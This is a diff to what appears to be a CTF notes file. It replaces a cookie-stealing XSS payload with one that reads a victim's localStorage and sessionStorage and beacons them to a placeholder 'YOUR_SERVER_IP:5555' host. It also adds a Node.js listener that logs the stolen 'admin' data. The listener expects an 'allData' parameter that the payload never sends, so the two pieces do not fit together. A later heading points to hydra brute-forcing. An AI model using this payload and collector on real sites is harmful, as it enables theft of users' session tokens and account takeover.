@@ -78,25 +78,36 @@ sudo python3 -m http.server 4444
   <head>
     <title>CTF</title>
     <script>
-      // Collect additional information
-      var cookies = document.cookie;
-      var userAgent = navigator.userAgent;
-      var platform = navigator.platform;
-      var language = navigator.language || navigator.userLanguage;
-      var screenSize = screen.width + 'x' + screen.height;
-      
-      // Encode the data to ensure it's safely transmitted
-      var data = encodeURIComponent(
-        'cookies=' + cookies +
-        '&userAgent=' + userAgent +
-        '&platform=' + platform +
-        '&language=' + language +
-        '&screenSize=' + screenSize
-      );
-      
-      // Send the data to your server
-      var i = new Image();
-      i.src = "http://YOUR_SERVER_IP:5555/?" + data;
+      (async function() {
+        try {
+          // Collect Local Storage Data
+          let localStorageData = {};
+          for (let i = 0; i < localStorage.length; i++) {
+            let key = localStorage.key(i);
+            localStorageData[key] = localStorage.getItem(key);
+          }
+
+          // Collect Session Storage Data
+          let sessionStorageData = {};
+          for (let i = 0; i < sessionStorage.length; i++) {
+            let key = sessionStorage.key(i);
+            sessionStorageData[key] = sessionStorage.getItem(key);
+          }
+
+          // Create an object to hold all storage data
+          let data = {
+            localStorage: localStorageData,
+            sessionStorage: sessionStorageData
+          };
+
+          // Send the data to your server
+          let img = new Image();
+          img.src = 'http://YOUR_SERVER_IP:5555/?storage=' + encodeURIComponent(JSON.stringify(data));
+        } catch (error) {
+          let img = new Image();
+          img.src = 'http://YOUR_SERVER_IP:5555/?error=' + encodeURIComponent(error);
+        }
+      })();
     </script>
   </head>
   <body>
@@ -116,14 +127,51 @@ node index.js
 const http = require('http');
 const url = require('url');
 
+// Create a server to receive the data
 http.createServer((req, res) => {
+  // Parse the incoming request's query parameters
   const queryObject = url.parse(req.url, true).query;
-  console.log('Received Data:', queryObject);
-  res.writeHead(200, { 'Content-Type': 'image/png' });
-  res.end('');
+
+  // Check if there's an 'allData' parameter
+  if (queryObject.allData) {
+    // Parse the received data
+    const receivedData = JSON.parse(decodeURIComponent(queryObject.allData));
+
+    // Display the received data in a readable format
+    console.log('--- Received Data from Admin ---\n');
+    
+    // Display User Agent
+    console.log('User-Agent: ', receivedData.userAgent, '\n');
+
+    // Display Cookies
+    console.log('Cookies: ', receivedData.cookies || 'No cookies found', '\n');
+
+    // Display Local Storage
+    console.log('Local Storage:');
+    console.table(receivedData.localStorage);
+
+    // Display Session Storage
+    console.log('\nSession Storage:');
+    console.table(receivedData.sessionStorage);
+
+    // Display Document Data
+    console.log('\nDocument Data:');
+    console.table(receivedData.document);
+
+  } else if (queryObject.error) {
+    // Log any errors that were encountered
+    console.error('Error: ', decodeURIComponent(queryObject.error));
+  } else {
+    console.log('Unknown Data Received:', queryObject);
+  }
+
+  // Send a response back to acknowledge receipt
+  res.writeHead(200, { 'Content-Type': 'text/plain' });
+  res.end('Data received and logged');
 }).listen(5555, () => {
   console.log('Server listening on port 5555');
 });
+
 ```
 
 ## Login brute-force with `hydra`
